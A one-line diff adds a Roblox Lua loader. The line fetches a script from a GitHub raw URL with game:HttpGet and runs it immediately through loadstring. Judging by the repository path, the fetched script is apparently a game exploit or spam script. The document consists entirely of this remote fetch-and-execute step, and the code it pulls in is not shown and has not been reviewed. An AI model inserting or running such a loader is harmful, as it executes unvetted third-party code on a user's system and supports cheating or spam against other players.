@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/karinderya-spam1-tlbivnxpo6tog7.lua"))()
